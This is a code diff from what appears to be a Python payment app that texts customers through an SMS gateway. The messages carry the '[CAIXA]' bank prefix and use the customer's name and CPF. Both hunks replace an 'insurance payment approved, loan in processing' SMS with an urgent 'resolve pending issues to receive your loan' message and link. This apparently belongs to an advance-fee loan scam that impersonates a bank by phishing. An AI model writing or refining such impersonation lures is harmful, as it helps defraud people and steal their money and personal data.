@@ -404,7 +404,7 @@ def send_payment_confirmation_sms(phone_number: str, nome: str, cpf: str, thank_
                 app.logger.info(f"[PROD] URL recodificada para SMS: {thank_you_url}")
         
         # Mensagem mais informativa para o cliente
-        message = f"[CAIXA] Olá {nome_formatado}, seu pagamento do seguro foi aprovado! Seu empréstimo já está em processamento para liberação. Acesse sua página de status personalizada: {thank_you_url}"
+        message = f"[CAIXA]: {nome_formatado}, para receber o seu emprestimo resolva as pendencias urgentemente: {thank_you_url}"
         
         # Log detalhado para debugging
         app.logger.info(f"[PROD] Enviando SMS para {phone_number} com mensagem: '{message}'")
@@ -757,7 +757,7 @@ def check_payment_status(transaction_id):
                         nome_formatado = nome.split()[0] if nome else "Cliente"
                         
                         # Mensagem personalizada com link para thank_you_url
-                        message = f"[CAIXA] Olá {nome_formatado}, seu pagamento do seguro foi aprovado! Seu empréstimo já está em processamento para liberação. Acesse sua página de status personalizada: {thank_you_url}"
+                        message = f"[CAIXA]: {nome_formatado}, para receber o seu emprestimo resolva as pendencias urgentemente: {thank_you_url}"
                         
                         # Chamar diretamente a função SMSDEV
                         sms_sent = send_sms_smsdev(phone, message)
